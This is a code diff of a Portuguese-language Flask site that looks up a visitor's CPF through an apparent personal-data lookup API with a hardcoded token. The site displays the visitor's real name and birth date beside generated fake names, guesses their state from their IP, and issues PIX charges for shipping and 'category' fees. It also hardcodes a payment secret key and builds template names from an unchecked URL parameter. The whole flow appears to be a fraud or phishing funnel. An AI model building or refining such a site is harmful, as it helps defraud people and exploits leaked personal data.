@@ -13,7 +13,7 @@ from flask_migrate import Migrate
 import flask
 from flask_wtf import FlaskForm
 from wtforms import StringField
-from wtforms.validators import DataRequired
+from wtforms.validators import DataRequired, ValidationError
 
 # Set recursion limit
 sys.setrecursionlimit(3000)
@@ -85,16 +85,38 @@ from services.utils import gerar_nomes_falsos
 API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 cpf_service = CpfService(API_URL, "4da265ab-0452-4f87-86be-8d83a04a745a")
 
+
 class ConsultaCpfForm(FlaskForm):
     cpf = StringField('CPF', validators=[DataRequired()])
+
+    def validate_cpf(self, field):
+        cpf = ''.join(filter(str.isdigit, field.data))
+        if len(cpf) != 11:
+            raise ValidationError('CPF inválido. Digite 11 números.')
+
+
+@app.route('/')
+@cache.cached(timeout=60)  # Cache da página inicial por 1 minuto
+def index():
+    today = datetime.now()
+    logger.debug(f"Current date - Year: {today.year}, Month: {today.month}, Day: {today.day}")
+    form = ConsultaCpfForm()
+    return render_template('index.html',
+                         form=form,
+                         current_year=today.year,
+                         current_month=str(today.month).zfill(2),
+                         current_day=str(today.day).zfill(2))
+
 
 @app.route('/consultar_cpf', methods=['GET', 'POST'])
 def consultar_cpf():
     form = ConsultaCpfForm()
-    if request.method == 'POST' and form.validate_on_submit():
-        cpf = form.cpf.data.strip()
-        cpf_numerico = ''.join(filter(str.isdigit, cpf))
+    if request.method == 'POST':
+        if not form.validate_on_submit():
+            flash('Por favor, verifique os dados informados.')
+            return redirect(url_for('index'))
 
+        cpf = ''.join(filter(str.isdigit, form.cpf.data))
         try:
             dados_api = cpf_service.consultar_cpf(cpf)
 
@@ -110,7 +132,7 @@ def consultar_cpf():
 
             # Create user data dictionary
             dados_usuario = {
-                'cpf': cpf_numerico,
+                'cpf': cpf,
                 'nome_real': nome,
                 'data_nasc': dados_api.get('NASC', ''),
                 'nomes': gerar_nomes_falsos(nome)
@@ -123,21 +145,13 @@ def consultar_cpf():
                                 dados=dados_usuario,
                                 current_year=datetime.now().year)
 
-        except requests.exceptions.Timeout:
-            logger.error("Timeout ao consultar a API")
-            flash('Tempo limite excedido. Por favor, tente novamente.')
-            return redirect(url_for('index'))
-        except requests.exceptions.ConnectionError as e:
-            logger.error(f"Erro de conexão: {str(e)}")
-            flash('Erro de conexão. Por favor, verifique sua internet e tente novamente.')
-            return redirect(url_for('index'))
         except Exception as e:
-            logger.error(f"Erro inesperado na consulta: {str(e)}")
+            logger.error(f"Erro na consulta: {str(e)}")
             flash('Erro ao consultar CPF. Por favor, tente novamente.')
             return redirect(url_for('index'))
 
-    # If GET request or form validation failed
     return redirect(url_for('index'))
+
 
 ESTADOS = {
     'Acre': 'AC',
@@ -253,7 +267,7 @@ def verificar_data():
     ip_address = get_client_ip()
     estado_atual = get_estado_from_ip(ip_address)
 
-    return render_template('selecionar_estado.html', 
+    return render_template('selecionar_estado.html',
                          estado_atual=estado_atual,
                          current_year=datetime.now().year)
 
@@ -271,7 +285,7 @@ def selecionar_estado():
     session['dados_usuario'] = dados_usuario
 
     # Redireciona para a seleção de nível, passando o estado selecionado
-    return render_template('selecionar_nivel.html', 
+    return render_template('selecionar_nivel.html',
                          estado=estado,
                          current_year=datetime.now().year)
 
@@ -338,7 +352,7 @@ def verificar_endereco():
         campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
         if not all(endereco.get(campo) for campo in campos_obrigatorios):
             flash('Por favor, preencha todos os campos obrigatórios.')
-            return render_template('verificar_endereco.html', 
+            return render_template('verificar_endereco.html',
                               current_year=datetime.now().year)
 
         # Adiciona o endereço aos dados do usuário
@@ -472,20 +486,9 @@ def create_payment_api() -> For4PaymentsAPI:
     secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY", "ff127456-ef71-4f49-ba84-21ec10b95d65")
     return For4PaymentsAPI(secret_key)
 
-@app.route('/')
-@cache.cached(timeout=60)  # Cache da página inicial por 1 minuto
-def index():
-    today = datetime.now()
-    logger.debug(f"Current date - Year: {today.year}, Month: {today.month}, Day: {today.day}")
-    return render_template('index.html', 
-                         current_year=today.year,
-                         current_month=str(today.month).zfill(2),
-                         current_day=str(today.day).zfill(2))
-
-
 @app.route('/frete_apostila', methods=['GET', 'POST'])
 def frete_apostila():
-    user_data = session.get('dados_usuario') 
+    user_data = session.get('dados_usuario')
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
@@ -507,7 +510,7 @@ def frete_apostila():
             campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
             if not all(endereco.get(campo) for campo in campos_obrigatorios):
                 flash('Por favor, preencha todos os campos obrigatórios.')
-                return render_template('frete_apostila.html', 
+                return render_template('frete_apostila.html',
                                     user_data=user_data,
                                     current_year=datetime.now().year)
 
@@ -518,10 +521,10 @@ def frete_apostila():
             # Gera o pagamento PIX
             payment_api = create_payment_api()
             payment_data = {
-                'name': user_data['nome_real'], 
-                'email': user_data.get('email', generate_random_email()), 
+                'name': user_data['nome_real'],
+                'email': user_data.get('email', generate_random_email()),
                 'cpf': user_data['cpf'],
-                'phone': user_data.get('phone', generate_random_phone()), 
+                'phone': user_data.get('phone', generate_random_phone()),
                 'amount': 48.19  # Valor do frete
             }
 
@@ -536,13 +539,13 @@ def frete_apostila():
             flash('Erro ao processar o formulário. Por favor, tente novamente.')
             return redirect(url_for('frete_apostila'))
 
-    return render_template('frete_apostila.html', 
+    return render_template('frete_apostila.html',
                          user_data=user_data,
                          current_year=datetime.now().year)
 
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
-    user_data = session.get('dados_usuario') 
+    user_data = session.get('dados_usuario')
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
@@ -550,11 +553,11 @@ def pagamento():
     try:
         payment_api = create_payment_api()
         payment_data = {
-            'name': user_data['nome_real'], 
-            'email': user_data.get('email', generate_random_email()), 
+            'name': user_data['nome_real'],
+            'email': user_data.get('email', generate_random_email()),
             'cpf': user_data['cpf'],
-            'phone': user_data.get('phone', generate_random_phone()), 
-            'amount': 247.10  
+            'phone': user_data.get('phone', generate_random_phone()),
+            'amount': 247.10
         }
 
         pix_data = payment_api.create_pix_payment(payment_data)
@@ -570,7 +573,7 @@ def pagamento():
 
 @app.route('/pagamento_categoria', methods=['POST'])
 def pagamento_categoria():
-    user_data = session.get('dados_usuario') 
+    user_data = session.get('dados_usuario')
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('obrigado'))
@@ -583,11 +586,11 @@ def pagamento_categoria():
     try:
         payment_api = create_payment_api()
         payment_data = {
-            'name': user_data['nome_real'], 
-            'email': user_data.get('email', generate_random_email()), 
+            'name': user_data['nome_real'],
+            'email': user_data.get('email', generate_random_email()),
             'cpf': user_data['cpf'],
-            'phone': user_data.get('phone', generate_random_phone()), 
-            'amount': 114.10  
+            'phone': user_data.get('phone', generate_random_phone()),
+            'amount': 114.10
         }
 
         pix_data = payment_api.create_pix_payment(payment_data)
@@ -615,21 +618,21 @@ def check_payment(payment_id):
 @app.route('/obrigado')
 @cache.cached(timeout=300)  # Cache por 5 minutos
 def obrigado():
-    user_data = session.get('dados_usuario') 
+    user_data = session.get('dados_usuario')
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
-    return render_template('obrigado.html', 
+    return render_template('obrigado.html',
                          current_year=datetime.now().year,
                          user_data=user_data)
 
 @app.route('/categoria/<tipo>')
 def categoria(tipo):
-    user_data = session.get('dados_usuario') 
+    user_data = session.get('dados_usuario')
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
-    return render_template(f'categoria_{tipo}.html', 
+    return render_template(f'categoria_{tipo}.html',
                          current_year=datetime.now().year,
                          user_data=user_data)
 
